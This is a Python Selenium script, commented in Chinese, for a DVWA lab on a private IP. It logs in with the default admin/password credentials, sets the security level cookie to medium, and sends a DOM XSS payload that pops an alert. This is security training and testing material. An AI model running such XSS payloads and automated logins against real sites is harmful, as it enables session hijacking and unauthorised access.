# python 3.7



import time
from selenium import webdriver


login_username = 'admin'
login_password = 'password'

test_url = 'http://172.16.110.232/DVWA/vulnerabilities/xss_d/?default=' #被测试的页面url
payloads = ['></option></select><iframe%20onload=alert(/xss/)>'] # payloads字典集合


# 实例化一个chrome浏览器进程
options = webdriver.ChromeOptions()
options.add_argument("start-maximized") #浏览器窗口尺寸最大化
options.add_argument("--auto-open-devtools-for-tabs") #自动打开开发者工具
options.add_experimental_option("excludeSwitches", ["enable-automation"])
options.add_experimental_option('useAutomationExtension', False)
driver = webdriver.Chrome(options=options, executable_path=r'./chromedriver')


# 自动登录DVWA（模拟人手操作的版本，其实还可以通过构造一个登录请求去自动登录，模拟人手的版本更直观）
def login(username, password):
    global driver
    login_url = 'http://172.16.110.232/DVWA/login.php'
    driver.get(login_url)

    name_input = driver.find_element_by_xpath('//*[@id="content"]/form/fieldset/input[1]')  # 找到用户名的框框
    pass_input = driver.find_element_by_xpath('//*[@id="content"]/form/fieldset/input[2]')  # 找到输入密码的框框
    login_button = driver.find_element_by_xpath('//*[@id="content"]/form/fieldset/p/input')  # 找到登录按钮

    name_input.clear()
    name_input.send_keys(username)  # 填写用户名
    # time.sleep(2)
    pass_input.clear()
    pass_input.send_keys(password)  # 填写密码
    # time.sleep(2)
    login_button.click()  # 点击登录

    # time.sleep(10) # 暂停10秒让人能看清楚自动化的过程
    print(driver.get_cookies())
    return driver.get_cookies()


# 将dvwa的难度等级设为中级（dvwa的难度等级是用一个cookie存了起来）
def set_level():
    global driver
    # ajax_script = 'var xhr = new XMLHttpRequest(); xhr.open("POST","/DVWA/security.php",true);xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");xhr.send("security=medium&seclev_submit=Submit&user_token=cd30e1017bbe1a4da2a19c3c818c67c4");'
    # driver.execute_script(ajax_script)
    # driver.close()
    driver.delete_cookie('security')
    driver.add_cookie({'name': 'security', 'value': 'medium'})


# 尝试利用 xss dom漏洞
def expolit_domXSS():
    global driver
    url = test_url + payloads[0]
    driver.get(url)


# 验证 xss dom漏洞 是否被成功利用的poc
def proof_of_concept():
    print('这里是验证payload是否被成功执行的代码。 有两种方案： ')
    print('一是获取到webdriver的状态，判断弹窗是否成功弹出，弹出了就可以认为存在dom xss漏洞。')
    print('二是获取到webdriver的状态，看被测试的页面html重新加载后payload代码是否被成功插入')


if __name__ == '__main__':
    login(login_username, login_password)
    set_level()
    expolit_domXSS()
    proof_of_concept()
